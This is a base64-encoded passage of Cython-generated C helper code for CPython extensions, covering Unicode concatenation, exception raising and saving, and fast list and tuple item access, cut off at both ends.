ICAgcmV0dXJuIDA7CiAgICBpZiAoIVB5VW5pY29kZV9DaGVja0V4YWN0KHVuaWNvZGUpKQogICAgICAgIHJldHVybiAwOwogICAgaWYgKFB5VW5pY29kZV9DSEVDS19JTlRFUk5FRCh1bmljb2RlKSkKICAgICAgICByZXR1cm4gMDsKICAgIHJldHVybiAxOwp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9QeVVuaWNvZGVfQ29uY2F0SW5QbGFjZUltcGwoUHlPYmplY3QgKipwX2xlZnQsIFB5T2JqZWN0ICpyaWdodAogICAgICAgICNpZiBDWVRIT05fUkVGTkFOTlkKICAgICAgICAsIHZvaWQqIF9fcHl4X3JlZm5hbm55CiAgICAgICAgI2VuZGlmCiAgICApIHsKICAgIFB5T2JqZWN0ICpsZWZ0ID0gKnBfbGVmdDsKICAgIFB5X3NzaXplX3QgbGVmdF9sZW4sIHJpZ2h0X2xlbiwgbmV3X2xlbjsKICAgIGlmICh1bmxpa2VseShfX1B5eF9QeVVuaWNvZGVfUkVBRFkobGVmdCkgPT0gLTEpKQogICAgICAgIHJldHVybiBOVUxMOwogICAgaWYgKHVubGlrZWx5KF9fUHl4X1B5VW5pY29kZV9SRUFEWShyaWdodCkgPT0gLTEpKQogICAgICAgIHJldHVybiBOVUxMOwogICAgbGVmdF9sZW4gPSBQeVVuaWNvZGVfR0VUX0xFTkdUSChsZWZ0KTsKICAgIGlmIChsZWZ0X2xlbiA9PSAwKSB7CiAgICAgICAgUHlfSU5DUkVGKHJpZ2h0KTsKICAgICAgICByZXR1cm4gcmlnaHQ7CiAgICB9CiAgICByaWdodF9sZW4gPSBQeVVuaWNvZGVfR0VUX0xFTkdUSChyaWdodCk7CiAgICBpZiAocmlnaHRfbGVuID09IDApIHsKICAgICAgICBQeV9JTkNSRUYobGVmdCk7CiAgICAgICAgcmV0dXJuIGxlZnQ7CiAgICB9CiAgICBpZiAodW5saWtlbHkobGVmdF9sZW4gPiBQWV9TU0laRV9UX01BWCAtIHJpZ2h0X2xlbikpIHsKICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfT3ZlcmZsb3dFcnJvciwKICAgICAgICAgICAgICAgICAgICAgICAgInN0cmluZ3MgYXJlIHRvbyBsYXJnZSB0byBjb25jYXQiKTsKICAgICAgICByZXR1cm4gTlVMTDsKICAgIH0KICAgIG5ld19sZW4gPSBsZWZ0X2xlbiArIHJpZ2h0X2xlbjsKICAgIGlmIChfX1B5eF91bmljb2RlX21vZGlmaWFibGUobGVmdCkKICAgICAgICAgICAgJiYgUHlVbmljb2RlX0NoZWNrRXhhY3QocmlnaHQpCiAgICAgICAgICAgICYmIFB5VW5pY29kZV9LSU5EKHJpZ2h0KSA8PSBQeVVuaWNvZGVfS0lORChsZWZ0KQogICAgICAgICAgICAmJiAhKFB5VW5pY29kZV9JU19BU0NJSShsZWZ0KSAmJiAhUHlVbmljb2RlX0lTX0FTQ0lJKHJpZ2h0KSkpIHsKICAgICAgICBpbnQgcmV0OwogICAgICAgIF9fUHl4X0dJVkVSRUYoKnBfbGVmdCk7CiAgICAgICAgcmV0ID0gUHlVbmljb2RlX1Jlc2l6ZShwX2xlZnQsIG5ld19sZW4pOwogICAgICAgIF9fUHl4X0dPVFJFRigqcF9sZWZ0KTsKICAgICAgICBpZiAodW5saWtlbHkocmV0ICE9IDApKQogICAgICAgICAgICByZXR1cm4gTlVMTDsKICAgICAgICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMAogICAgICAgIGlmICh1bmxpa2VseShQeVVuaWNvZGVfQ29weUNoYXJhY3RlcnMoKnBfbGVmdCwgbGVmdF9sZW4sIHJpZ2h0LCAwLCByaWdodF9sZW4pIDwgMCkpIHJldHVybiBOVUxMOwogICAgICAgICNlbHNlCiAgICAgICAgX1B5VW5pY29kZV9GYXN0Q29weUNoYXJhY3RlcnMoKnBfbGVmdCwgbGVmdF9sZW4sIHJpZ2h0LCAwLCByaWdodF9sZW4pOwogICAgICAgICNlbmRpZgogICAgICAgIF9fUHl4X0lOQ1JFRigqcF9sZWZ0KTsKICAgICAgICBfX1B5eF9HSVZFUkVGKCpwX2xlZnQpOwogICAgICAgIHJldHVybiAqcF9sZWZ0OwogICAgfSBlbHNlIHsKICAgICAgICByZXR1cm4gX19QeXhfUHlVbmljb2RlX0NvbmNhdChsZWZ0LCByaWdodCk7CiAgICB9CiAgfQojZW5kaWYKCgpzdGF0aWMgdm9pZCBfX1B5eF9SYWlzZShQeU9iamVjdCAqdHlwZSwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqdGIsIFB5T2JqZWN0ICpjYXVzZSkgewogICAgUHlPYmplY3QqIG93bmVkX2luc3RhbmNlID0gTlVMTDsKICAgIGlmICh0YiA9PSBQeV9Ob25lKSB7CiAgICAgICAgdGIgPSAwOwogICAgfSBlbHNlIGlmICh0YiAmJiAhUHlUcmFjZUJhY2tfQ2hlY2sodGIpKSB7CiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1R5cGVFcnJvciwKICAgICAgICAgICAgInJhaXNlOiBhcmcgMyBtdXN0IGJlIGEgdHJhY2ViYWNrIG9yIE5vbmUiKTsKICAgICAgICBnb3RvIGJhZDsKICAgIH0KICAgIGlmICh2YWx1ZSA9PSBQeV9Ob25lKQogICAgICAgIHZhbHVlID0gMDsKICAgIGlmIChQeUV4Y2VwdGlvbkluc3RhbmNlX0NoZWNrKHR5cGUpKSB7CiAgICAgICAgaWYgKHZhbHVlKSB7CiAgICAgICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgICAgICAgICAiaW5zdGFuY2UgZXhjZXB0aW9uIG1heSBub3QgaGF2ZSBhIHNlcGFyYXRlIHZhbHVlIik7CiAgICAgICAgICAgIGdvdG8gYmFkOwogICAgICAgIH0KICAgICAgICB2YWx1ZSA9IHR5cGU7CiAgICAgICAgdHlwZSA9IChQeU9iamVjdCopIFB5X1RZUEUodmFsdWUpOwogICAgfSBlbHNlIGlmIChQeUV4Y2VwdGlvbkNsYXNzX0NoZWNrKHR5cGUpKSB7CiAgICAgICAgUHlPYmplY3QgKmluc3RhbmNlX2NsYXNzID0gTlVMTDsKICAgICAgICBpZiAodmFsdWUgJiYgUHlFeGNlcHRpb25JbnN0YW5jZV9DaGVjayh2YWx1ZSkpIHsKICAgICAgICAgICAgaW5zdGFuY2VfY2xhc3MgPSAoUHlPYmplY3QqKSBQeV9UWVBFKHZhbHVlKTsKICAgICAgICAgICAgaWYgKGluc3RhbmNlX2NsYXNzICE9IHR5cGUpIHsKICAgICAgICAgICAgICAgIGludCBpc19zdWJjbGFzcyA9IFB5T2JqZWN0X0lzU3ViY2xhc3MoaW5zdGFuY2VfY2xhc3MsIHR5cGUpOwogICAgICAgICAgICAgICAgaWYgKCFpc19zdWJjbGFzcykgewogICAgICAgICAgICAgICAgICAgIGluc3RhbmNlX2NsYXNzID0gTlVMTDsKICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAodW5saWtlbHkoaXNfc3ViY2xhc3MgPT0gLTEpKSB7CiAgICAgICAgICAgICAgICAgICAgZ290byBiYWQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIHR5cGUgPSBpbnN0YW5jZV9jbGFzczsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBpZiAoIWluc3RhbmNlX2NsYXNzKSB7CiAgICAgICAgICAgIFB5T2JqZWN0ICphcmdzOwogICAgICAgICAgICBpZiAoIXZhbHVlKQogICAgICAgICAgICAgICAgYXJncyA9IFB5VHVwbGVfTmV3KDApOwogICAgICAgICAgICBlbHNlIGlmIChQeVR1cGxlX0NoZWNrKHZhbHVlKSkgewogICAgICAgICAgICAgICAgUHlfSU5DUkVGKHZhbHVlKTsKICAgICAgICAgICAgICAgIGFyZ3MgPSB2YWx1ZTsKICAgICAgICAgICAgfSBlbHNlCiAgICAgICAgICAgICAgICBhcmdzID0gUHlUdXBsZV9QYWNrKDEsIHZhbHVlKTsKICAgICAgICAgICAgaWYgKCFhcmdzKQogICAgICAgICAgICAgICAgZ290byBiYWQ7CiAgICAgICAgICAgIG93bmVkX2luc3RhbmNlID0gUHlPYmplY3RfQ2FsbCh0eXBlLCBhcmdzLCBOVUxMKTsKICAgICAgICAgICAgUHlfREVDUkVGKGFyZ3MpOwogICAgICAgICAgICBpZiAoIW93bmVkX2luc3RhbmNlKQogICAgICAgICAgICAgICAgZ290byBiYWQ7CiAgICAgICAgICAgIHZhbHVlID0gb3duZWRfaW5zdGFuY2U7CiAgICAgICAgICAgIGlmICghUHlFeGNlcHRpb25JbnN0YW5jZV9DaGVjayh2YWx1ZSkpIHsKICAgICAgICAgICAgICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgImNhbGxpbmcgJVIgc2hvdWxkIGhhdmUgcmV0dXJuZWQgYW4gaW5zdGFuY2Ugb2YgIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICJCYXNlRXhjZXB0aW9uLCBub3QgJVIiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIHR5cGUsIFB5X1RZUEUodmFsdWUpKTsKICAgICAgICAgICAgICAgIGdvdG8gYmFkOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfSBlbHNlIHsKICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfVHlwZUVycm9yLAogICAgICAgICAgICAicmFpc2U6IGV4Y2VwdGlvbiBjbGFzcyBtdXN0IGJlIGEgc3ViY2xhc3Mgb2YgQmFzZUV4Y2VwdGlvbiIpOwogICAgICAgIGdvdG8gYmFkOwogICAgfQogICAgaWYgKGNhdXNlKSB7CiAgICAgICAgUHlPYmplY3QgKmZpeGVkX2NhdXNlOwogICAgICAgIGlmIChjYXVzZSA9PSBQeV9Ob25lKSB7CiAgICAgICAgICAgIGZpeGVkX2NhdXNlID0gTlVMTDsKICAgICAgICB9IGVsc2UgaWYgKFB5RXhjZXB0aW9uQ2xhc3NfQ2hlY2soY2F1c2UpKSB7CiAgICAgICAgICAgIGZpeGVkX2NhdXNlID0gUHlPYmplY3RfQ2FsbE9iamVjdChjYXVzZSwgTlVMTCk7CiAgICAgICAgICAgIGlmIChmaXhlZF9jYXVzZSA9PSBOVUxMKQogICAgICAgICAgICAgICAgZ290byBiYWQ7CiAgICAgICAgfSBlbHNlIGlmIChQeUV4Y2VwdGlvbkluc3RhbmNlX0NoZWNrKGNhdXNlKSkgewogICAgICAgICAgICBmaXhlZF9jYXVzZSA9IGNhdXNlOwogICAgICAgICAgICBQeV9JTkNSRUYoZml4ZWRfY2F1c2UpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiZXhjZXB0aW9uIGNhdXNlcyBtdXN0IGRlcml2ZSBmcm9tICIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJCYXNlRXhjZXB0aW9uIik7CiAgICAgICAgICAgIGdvdG8gYmFkOwogICAgICAgIH0KICAgICAgICBQeUV4Y2VwdGlvbl9TZXRDYXVzZSh2YWx1ZSwgZml4ZWRfY2F1c2UpOwogICAgfQogICAgUHlFcnJfU2V0T2JqZWN0KHR5cGUsIHZhbHVlKTsKICAgIGlmICh0YikgewojaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBDMDBBNgogICAgICAgIFB5RXhjZXB0aW9uX1NldFRyYWNlYmFjayh2YWx1ZSwgdGIpOwojZWxpZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEUKICAgICAgICBQeVRocmVhZFN0YXRlICp0c3RhdGUgPSBfX1B5eF9QeVRocmVhZFN0YXRlX0N1cnJlbnQ7CiAgICAgICAgUHlPYmplY3QqIHRtcF90YiA9IHRzdGF0ZS0+Y3VyZXhjX3RyYWNlYmFjazsKICAgICAgICBpZiAodGIgIT0gdG1wX3RiKSB7CiAgICAgICAgICAgIFB5X0lOQ1JFRih0Yik7CiAgICAgICAgICAgIHRzdGF0ZS0+Y3VyZXhjX3RyYWNlYmFjayA9IHRiOwogICAgICAgICAgICBQeV9YREVDUkVGKHRtcF90Yik7CiAgICAgICAgfQojZWxzZQogICAgICAgIFB5T2JqZWN0ICp0bXBfdHlwZSwgKnRtcF92YWx1ZSwgKnRtcF90YjsKICAgICAgICBQeUVycl9GZXRjaCgmdG1wX3R5cGUsICZ0bXBfdmFsdWUsICZ0bXBfdGIpOwogICAgICAgIFB5X0lOQ1JFRih0Yik7CiAgICAgICAgUHlFcnJfUmVzdG9yZSh0bXBfdHlwZSwgdG1wX3ZhbHVlLCB0Yik7CiAgICAgICAgUHlfWERFQ1JFRih0bXBfdGIpOwojZW5kaWYKICAgIH0KYmFkOgogICAgUHlfWERFQ1JFRihvd25lZF9pbnN0YW5jZSk7CiAgICByZXR1cm47Cn0KCgpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlVbmljb2RlX1VuaWNvZGUoUHlPYmplY3QgKm9iaikgewogICAgaWYgKHVubGlrZWx5KG9iaiA9PSBQeV9Ob25lKSkKICAgICAgICBvYmogPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X05vbmU7CiAgICByZXR1cm4gX19QeXhfTmV3UmVmKG9iaik7Cn0KCgpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X0dldEl0ZW1JbnRfR2VuZXJpYyhQeU9iamVjdCAqbywgUHlPYmplY3QqIGopIHsKICAgIFB5T2JqZWN0ICpyOwogICAgaWYgKHVubGlrZWx5KCFqKSkgcmV0dXJuIE5VTEw7CiAgICByID0gUHlPYmplY3RfR2V0SXRlbShvLCBqKTsKICAgIFB5X0RFQ1JFRihqKTsKICAgIHJldHVybiByOwp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9HZXRJdGVtSW50X0xpc3RfRmFzdChQeU9iamVjdCAqbywgUHlfc3NpemVfdCBpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENZVEhPTl9OQ1BfVU5VU0VEIGludCB3cmFwYXJvdW5kLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENZVEhPTl9OQ1BfVU5VU0VEIGludCBib3VuZHNjaGVjaykgewojaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRSAmJiAhQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMgJiYgIUNZVEhPTl9BVk9JRF9USFJFQURfVU5TQUZFX0JPUlJPV0VEX1JFRlMKICAgIFB5X3NzaXplX3Qgd3JhcHBlZF9pID0gaTsKICAgIGlmICh3cmFwYXJvdW5kICYgdW5saWtlbHkoaSA8IDApKSB7CiAgICAgICAgd3JhcHBlZF9pICs9IFB5TGlzdF9HRVRfU0laRShvKTsKICAgIH0KICAgIGlmICgoIWJvdW5kc2NoZWNrKSB8fCBsaWtlbHkoX19QeXhfaXNfdmFsaWRfaW5kZXgod3JhcHBlZF9pLCBQeUxpc3RfR0VUX1NJWkUobykpKSkgewogICAgICAgIFB5T2JqZWN0ICpyID0gUHlMaXN0X0dFVF9JVEVNKG8sIHdyYXBwZWRfaSk7CiAgICAgICAgUHlfSU5DUkVGKHIpOwogICAgICAgIHJldHVybiByOwogICAgfQogICAgcmV0dXJuIF9fUHl4X0dldEl0ZW1JbnRfR2VuZXJpYyhvLCBQeUxvbmdfRnJvbVNzaXplX3QoaSkpOwojZWxzZQogICAgcmV0dXJuIFB5U2VxdWVuY2VfR2V0SXRlbShvLCBpKTsKI2VuZGlmCn0Kc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X0dldEl0ZW1JbnRfVHVwbGVfRmFzdChQeU9iamVjdCAqbywgUHlfc3NpemVfdCBpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENZVEhPTl9OQ1BfVU5VU0VEIGludCB3cmFwYXJvdW5kLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENZVEhPTl9OQ1BfVU5VU0VEIGludCBib3VuZHNjaGVjaykgewojaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRSAmJiAhQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMKICAgIFB5X3NzaXplX3Qgd3JhcHBlZF9pID0gaTsKICAgIGlmICh3cmFwYXJvdW5kICYgdW5saWtlbHkoaSA8IDApKSB7CiAgICAgICAgd3JhcHBlZF9pICs9IFB5VHVwbGVfR0VUX1NJWkUobyk7CiAgICB9CiAgICBpZiAoKCFib3VuZHNjaGVjaykgfHwgbGlrZWx5KF9fUHl4X2lzX3ZhbGlkX2luZGV4KHdyYXBwZWRfaSwgUHlUdXBsZV9HRVRfU0laRShvKSkpKSB7CiAgICAgICAgUHlPYmplY3QgKnIgPSBQeVR1cGxlX0dFVF9JVEVNKG8sIHdyYXBwZWRfaSk7CiAgICAgICAgUHlfSU5DUkVGKHIpOwogICAgICAgIHJldHVybiByOwogICAgfQogICAgcmV0dXJuIF9fUHl4X0dldEl0ZW1JbnRfR2VuZXJpYyhvLCBQeUxvbmdfRnJvbVNzaXplX3QoaSkpOwojZWxzZQogICAgcmV0dXJuIFB5U2VxdWVuY2VfR2V0SXRlbShvLCBpKTsKI2VuZGlmCn0Kc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X0dldEl0ZW1JbnRfRmFzdChQeU9iamVjdCAqbywgUHlfc3NpemVfdCBpLCBpbnQgaXNfbGlzdCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBDWVRIT05fTkNQX1VOVVNFRCBpbnQgd3JhcGFyb3VuZCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBDWVRIT05fTkNQX1VOVVNFRCBpbnQgYm91bmRzY2hlY2spIHsKI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUgJiYgIUNZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTICYmIENZVEhPTl9VU0VfVFlQRV9TTE9UUwogICAgaWYgKGlzX2xpc3QgfHwgUHlMaXN0X0NoZWNrRXhhY3QobykpIHsKICAgICAgICBQeV9zc2l6ZV90IG4gPSAoKCF3cmFwYXJvdW5kKSB8IGxpa2VseShpID49IDApKSA/IGkgOiBpICsgUHlMaXN0X0dFVF9TSVpFKG8pOwogICAgICAgIGlmICgoIWJvdW5kc2NoZWNrKSB8fCAobGlrZWx5KF9fUHl4X2lzX3ZhbGlkX2luZGV4KG4sIFB5TGlzdF9HRVRfU0laRShvKSkpKSkgewogICAgICAgICAgICByZXR1cm4gX19QeXhfUHlMaXN0X0dldEl0ZW1SZWYobywgbik7CiAgICAgICAgfQogICAgfQogICAgZWxzZSBpZiAoUHlUdXBsZV9DaGVja0V4YWN0KG8pKSB7CiAgICAgICAgUHlfc3NpemVfdCBuID0gKCghd3JhcGFyb3VuZCkgfCBsaWtlbHkoaSA+PSAwKSkgPyBpIDogaSArIFB5VHVwbGVfR0VUX1NJWkUobyk7CiAgICAgICAgaWYgKCghYm91bmRzY2hlY2spIHx8IGxpa2VseShfX1B5eF9pc192YWxpZF9pbmRleChuLCBQeVR1cGxlX0dFVF9TSVpFKG8pKSkpIHsKICAgICAgICAgICAgUHlPYmplY3QgKnIgPSBQeVR1cGxlX0dFVF9JVEVNKG8sIG4pOwogICAgICAgICAgICBQeV9JTkNSRUYocik7CiAgICAgICAgICAgIHJldHVybiByOwogICAgICAgIH0KICAgIH0gZWxzZSB7CiAgICAgICAgUHlNYXBwaW5nTWV0aG9kcyAqbW0gPSBQeV9UWVBFKG8pLT50cF9hc19tYXBwaW5nOwogICAgICAgIFB5U2VxdWVuY2VNZXRob2RzICpzbSA9IFB5X1RZUEUobyktPnRwX2FzX3NlcXVlbmNlOwogICAgICAgIGlmIChtbSAmJiBtbS0+bXBfc3Vic2NyaXB0KSB7CiAgICAgICAgICAgIFB5T2JqZWN0ICpyLCAqa2V5ID0gUHlMb25nX0Zyb21Tc2l6ZV90KGkpOwogICAgICAgICAgICBpZiAodW5saWtlbHkoIWtleSkpIHJldHVybiBOVUxMOwogICAgICAgICAgICByID0gbW0tPm1wX3N1YnNjcmlwdChvLCBrZXkpOwogICAgICAgICAgICBQeV9ERUNSRUYoa2V5KTsKICAgICAgICAgICAgcmV0dXJuIHI7CiAgICAgICAgfQogICAgICAgIGlmIChsaWtlbHkoc20gJiYgc20tPnNxX2l0ZW0pKSB7CiAgICAgICAgICAgIGlmICh3cmFwYXJvdW5kICYmIHVubGlrZWx5KGkgPCAwKSAmJiBsaWtlbHkoc20tPnNxX2xlbmd0aCkpIHsKICAgICAgICAgICAgICAgIFB5X3NzaXplX3QgbCA9IHNtLT5zcV9sZW5ndGgobyk7CiAgICAgICAgICAgICAgICBpZiAobGlrZWx5KGwgPj0gMCkpIHsKICAgICAgICAgICAgICAgICAgICBpICs9IGw7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGlmICghUHlFcnJfRXhjZXB0aW9uTWF0Y2hlcyhQeUV4Y19PdmVyZmxvd0Vycm9yKSkKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIE5VTEw7CiAgICAgICAgICAgICAgICAgICAgUHlFcnJfQ2xlYXIoKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4gc20tPnNxX2l0ZW0obywgaSk7CiAgICAgICAgfQogICAgfQojZWxzZQogICAgaWYgKGlzX2xpc3QgfHwgIVB5TWFwcGluZ19DaGVjayhvKSkgewogICAgICAgIHJldHVybiBQeVNlcXVlbmNlX0dldEl0ZW0obywgaSk7CiAgICB9CiNlbmRpZgogICAgcmV0dXJuIF9fUHl4X0dldEl0ZW1JbnRfR2VuZXJpYyhvLCBQeUxvbmdfRnJvbVNzaXplX3QoaSkpOwp9CgoKI2lmIENZVEhPTl9VU0VfUFlUWVBFX0xPT0tVUCAmJiBDWVRIT05fVVNFX1RZUEVfU0xPVFMKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X19QeU9iamVjdF9Mb29rdXBTcGVjaWFsKFB5T2JqZWN0KiBvYmosIFB5T2JqZWN0KiBhdHRyX25hbWUsIGludCB3aXRoX2Vycm9yKSB7CiAgICBQeU9iamVjdCAqcmVzOwogICAgUHlUeXBlT2JqZWN0ICp0cCA9IFB5X1RZUEUob2JqKTsKICAgIHJlcyA9IF9QeVR5cGVfTG9va3VwKHRwLCBhdHRyX25hbWUpOwogICAgaWYgKGxpa2VseShyZXMpKSB7CiAgICAgICAgZGVzY3JnZXRmdW5jIGYgPSBQeV9UWVBFKHJlcyktPnRwX2Rlc2NyX2dldDsKICAgICAgICBpZiAoIWYpIHsKICAgICAgICAgICAgUHlfSU5DUkVGKHJlcyk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgcmVzID0gZihyZXMsIG9iaiwgKFB5T2JqZWN0ICopdHApOwogICAgICAgIH0KICAgIH0gZWxzZSBpZiAod2l0aF9lcnJvcikgewogICAgICAgIFB5RXJyX1NldE9iamVjdChQeUV4Y19BdHRyaWJ1dGVFcnJvciwgYXR0cl9uYW1lKTsKICAgIH0KICAgIHJldHVybiByZXM7Cn0KI2VuZGlmCgoKI2lmIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0sgJiYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFCnN0YXRpYyBfUHlFcnJfU3RhY2tJdGVtICoKX19QeXhfUHlFcnJfR2V0VG9wbW9zdEV4Y2VwdGlvbihQeVRocmVhZFN0YXRlICp0c3RhdGUpCnsKICAgIF9QeUVycl9TdGFja0l0ZW0gKmV4Y19pbmZvID0gdHN0YXRlLT5leGNfaW5mbzsKICAgIHdoaWxlICgoZXhjX2luZm8tPmV4Y192YWx1ZSA9PSBOVUxMIHx8IGV4Y19pbmZvLT5leGNfdmFsdWUgPT0gUHlfTm9uZSkgJiYKICAgICAgICAgICBleGNfaW5mby0+cHJldmlvdXNfaXRlbSAhPSBOVUxMKQogICAgewogICAgICAgIGV4Y19pbmZvID0gZXhjX2luZm8tPnByZXZpb3VzX2l0ZW07CiAgICB9CiAgICByZXR1cm4gZXhjX2luZm87Cn0KI2VuZGlmCgoKI2lmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURQpzdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X19FeGNlcHRpb25TYXZlKFB5VGhyZWFkU3RhdGUgKnRzdGF0ZSwgUHlPYmplY3QgKip0eXBlLCBQeU9iamVjdCAqKnZhbHVlLCBQeU9iamVjdCAqKnRiKSB7CiAgI2lmIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0sgJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBCMDBhNAogICAgX1B5RXJyX1N0YWNrSXRlbSAqZXhjX2luZm8gPSBfX1B5eF9QeUVycl9HZXRUb3Btb3N0RXhjZXB0aW9uKHRzdGF0ZSk7CiAgICBQeU9iamVjdCAqZXhjX3ZhbHVlID0gZXhjX2luZm8tPmV4Y192YWx1ZTsKICAgIGlmIChleGNfdmFsdWUgPT0gTlVMTCB8fCBleGNfdmFsdWUgPT0gUHlfTm9uZSkgewogICAgICAgICp2YWx1ZSA9IE5VTEw7CiAgICAgICAgKnR5cGUgPSBOVUxMOwogICAgICAgICp0YiA9IE5VTEw7CiAgICB9IGVsc2UgewogICAgICAgICp2YWx1ZSA9IGV4Y192YWx1ZTsKICAgICAgICBQeV9JTkNSRUYoKnZhbHVlKTsKICAgICAgICAqdHlwZSA9IChQeU9iamVjdCopIFB5X1RZUEUoZXhjX3ZhbHVlKTsKICAgICAgICBQeV9JTkNSRUYoKnR5cGUpOwogICAgICAgICp0YiA9IFB5RXhjZXB0aW9uX0dldFRyYWNlYmFjayhleGNfdmFsdWUpOwogICAgfQogICNlbGlmIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0sKICAgIF9QeUVycl9TdGFja0l0ZW0gKmV4Y19pbmZvID0gX19QeXhfUHlFcnJfR2V0VG9wbW9zdEV4Y2VwdGlvbih0c3RhdGUpOwogICAgKnR5cGUgPSBleGNfaW5mby0+ZXhjX3R5cGU7CiAgICAqdmFsdWUgPSBleGNfaW5mby0+ZXhjX3ZhbHVlOwogICAgKnRiID0gZXhjX2luZm8tPmV4Y190cmFjZWJhY2s7CiAgICBQeV9YSU5DUkVGKCp0eXBlKTsKICAgIFB5X1hJTkNSRUYoKnZhbHVlKTsKICAgIFB5X1hJTkNSRUYoKnRiKTsKICAjZWxzZQogICAgKnR5cGUgPSB0c3RhdGUtPmV4Y190eXBlOwogICAgKnZhbHVlID0gdHN0YXRlLT5leGNfdmFsdWU7CiAgICAqdGIgPSB0c3RhdGUtPmV4Y190cmFjZWJhY2s7CiAgICBQeV9YSU5DUkVGKCp0eXBlKTsKICAgIFB5X1hJTkNSRUYoKnZhbHVlKTsKICAgIFB5X1hJTkNSRUYoKnRiKTsKICAjZW5kaWYKfQpzdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X19FeGNlcHRpb25SZXNldChQeVRocmVhZFN0YXRlICp0c3RhdGUsIFB5T2JqZWN0ICp0eXBlLCBQeU9iamVjdCAqdmFsdWUsIFB5T2JqZWN0ICp0YikgewogICNpZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQjAwYTQKICAgIF9QeUVycl9TdGFja0l0ZW0gKmV4Y19pbmZvID0gdHN0YXRlLT5leGNfaW5mbzsKICAgIFB5T2JqZWN0ICp0bXBfdmFsdWUgPSBleGNfaW5mby0+ZXhjX3ZhbHVlOwogICAgZXhjX2luZm8tPmV4Y192YWx1ZSA9IHZhbHVlOwogICAgUHlfWERFQ1JFRih0bXBfdmFsdWUpOwogICAgUHlfWERFQ1JFRih0eXBlKTsKICAgIFB5X1hERUNSRUYodGIpOwogICNlbHNlCiAgICBQeU9iamVjdCAqdG1wX3R5cGUsICp0bXBfdmFsdWUsICp0bXBfdGI7CiAgICAjaWYgQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDSwogICAgX1B5RXJyX1N0YWNrSXRlbSAqZXhjX2luZm8gPSB0c3RhdGUtPmV4Y19pbmZvOwogICAgdG1wX3R5cGUgPSBleGNfaW5mby0+ZXhjX3R5cGU7CiAgICB0bXBfdmFsdWUgPSBleGNfaW5mby0+ZXhjX3ZhbHVlOwogICAgdG1wX3RiID0gZXhjX2luZm8tPmV4Y190cmFjZWJhY2s7CiAgICBleGNfaW5mby0+ZXhjX3R5cGUgPSB0eXBlOwogICAgZXhjX2luZm8tPmV4Y192YWx1ZSA9IHZhbHVlOwogICAgZXhjX2luZm8tPmV4Y190cm